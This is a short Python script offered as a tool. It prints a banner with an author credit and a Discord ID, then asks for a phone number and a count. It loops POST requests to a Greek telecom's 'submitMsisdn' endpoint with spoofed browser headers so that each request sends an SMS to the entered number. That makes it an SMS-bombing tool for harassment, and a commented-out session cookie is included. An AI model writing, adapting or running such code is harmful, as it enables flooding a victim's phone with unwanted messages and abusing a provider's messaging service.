import requests
from colorama import init
from colorama import Fore

init()


print(f"""                                          
{Fore.RED}@@@@@@@   @@@@@@    @@@@@@   @@@@@@@@  @@@
@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  
  @@!    @@!  @@@  @@!  @@@       @@!  @@!  
  !@!    !@!  @!@  !@!  @!@      !@!   !@!  
  @!!    @!@  !@!  @!@  !@!     @!!    !!@  
  !!!    !@!  !!!  !@!  !!!    !!!     !!!  
  !!:    !!:  !!!  !!:  !!!   !!:      !!:  
  :!:    :!:  !:!  :!:  !:!  :!:       :!:  
   ::    ::::: ::  ::::: ::   :: ::::   ::  
   :      : :  :    : :  :   : :: : :  :    
          {Fore.RESET} 

{Fore.MAGENTA}Made With Toozi | Discord @ cmonty732 | ID 249347422017290240{Fore.RESET}                         
""")

number = input("Enter Number: ")
smsnumber = int(input("How many times: "))

for _ in range(smsnumber):

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://settings.cosmote.gr',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        # 'cookie': 'dtCookie=v_4_srv_10_sn_1551885FAFA78348A2DD4937F4119738_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_0_rcs-3Acss_0; visid_incap_3141199=npZI7c2jRm2Fl/MAiDu3VR9lL2gAAAAAQUIPAAAAAAAt8CF+6EC62tHuIkaPqBOp; incap_ses_287_3141199=NrZ/QupBTn69BvU1U6H7Ax9lL2gAAAAA9L4Cf2IKoXamg4n3FM2mlg==',
    }

    json_data = {
        'msisdn': number,
        'campaignType': '',
    }

    response = requests.post('https://settings.cosmote.gr/submitMsisdn', headers=headers, json=json_data).json()
    print(response)
